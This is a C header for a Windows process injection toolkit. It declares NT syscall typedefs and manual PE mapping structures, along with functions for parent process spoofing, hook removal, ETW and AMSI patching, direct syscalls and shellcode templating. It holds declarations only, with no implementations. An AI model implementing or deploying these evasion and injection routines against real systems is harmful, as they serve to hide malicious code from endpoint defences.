/*
 * Windows-specific Process Injection
 */

#ifndef INJECT_WINDOWS_H
#define INJECT_WINDOWS_H

#ifdef PLATFORM_WINDOWS

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>

// NTDLL function pointers
typedef NTSTATUS (NTAPI* NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS (NTAPI* NtUnmapViewOfSection_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

typedef NTSTATUS (NTAPI* NtQueueApcThread_t)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);

typedef NTSTATUS (NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI* NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// Process information structures
typedef struct {
    HANDLE process_handle;
    HANDLE thread_handle;
    DWORD process_id;
    DWORD thread_id;
    LPVOID image_base;
    LPVOID entry_point;
    BOOL is_wow64;
} windows_process_info_t;

// Thread information
typedef struct {
    DWORD thread_id;
    HANDLE thread_handle;
    DWORD suspend_count;
    DWORD priority;
    LPVOID start_address;
    BOOL is_alertable;
} windows_thread_info_t;

// PE information for manual mapping
typedef struct {
    LPVOID file_buffer;
    SIZE_T file_size;
    PIMAGE_DOS_HEADER dos_header;
    PIMAGE_NT_HEADERS nt_headers;
    PIMAGE_SECTION_HEADER sections;
    WORD section_count;
    DWORD image_size;
    DWORD entry_point;
    DWORD image_base;
    BOOL is_dll;
    BOOL has_relocations;
    BOOL has_imports;
    BOOL has_tls;
} pe_info_t;

// Direct syscall structures
typedef struct {
    DWORD syscall_number;
    LPVOID stub_address;
    BYTE original_bytes[24];
} syscall_stub_t;

// Windows-specific injection functions
inject_status_t inject_enable_privilege(const char* privilege_name);
inject_status_t inject_get_process_handle(DWORD pid, DWORD desired_access, HANDLE* handle);
inject_status_t inject_get_thread_handle(DWORD tid, DWORD desired_access, HANDLE* handle);
inject_status_t inject_suspend_process(HANDLE process_handle);
inject_status_t inject_resume_process(HANDLE process_handle);

// Thread enumeration
inject_status_t inject_enum_threads(DWORD pid, windows_thread_info_t** threads, DWORD* count);
inject_status_t inject_find_alertable_thread(DWORD pid, DWORD* thread_id);

// PE operations
inject_status_t inject_parse_pe(LPVOID buffer, SIZE_T size, pe_info_t* pe_info);
inject_status_t inject_map_pe_sections(HANDLE process, LPVOID base, pe_info_t* pe_info);
inject_status_t inject_process_pe_imports(HANDLE process, LPVOID base, pe_info_t* pe_info);
inject_status_t inject_process_pe_relocations(HANDLE process, LPVOID base, pe_info_t* pe_info, LPVOID new_base);
inject_status_t inject_process_pe_tls(HANDLE process, LPVOID base, pe_info_t* pe_info);

// Parent process spoofing
inject_status_t inject_create_process_with_parent(const char* exe_path, DWORD parent_pid, 
                                                   PROCESS_INFORMATION* pi, BOOL suspended);

// Hook detection and removal
inject_status_t inject_detect_hooks(LPVOID module_base, DWORD* hook_count);
inject_status_t inject_remove_hooks(LPVOID module_base);

// ETW and AMSI bypass
inject_status_t inject_patch_etw(void);
inject_status_t inject_patch_amsi(void);

// Direct syscall setup
inject_status_t inject_init_syscalls(void);
inject_status_t inject_get_syscall_stub(const char* function_name, syscall_stub_t* stub);
NTSTATUS inject_syscall_NtAllocateVirtualMemory(HANDLE process, PVOID* base, SIZE_T* size, ULONG protect);
NTSTATUS inject_syscall_NtWriteVirtualMemory(HANDLE process, PVOID base, PVOID buffer, SIZE_T size);
NTSTATUS inject_syscall_NtCreateThreadEx(HANDLE process, LPTHREAD_START_ROUTINE start, LPVOID param, PHANDLE thread);

// Shellcode templates
typedef struct {
    BYTE* code;
    SIZE_T size;
    SIZE_T payload_offset;  // Where to place the actual payload
} shellcode_template_t;

inject_status_t inject_get_shellcode_template(const char* type, shellcode_template_t* template);
inject_status_t inject_build_shellcode(LPVOID payload, SIZE_T payload_size, 
                                       shellcode_template_t* template, LPVOID* final_code, SIZE_T* final_size);

#endif // PLATFORM_WINDOWS

#endif // INJECT_WINDOWS_H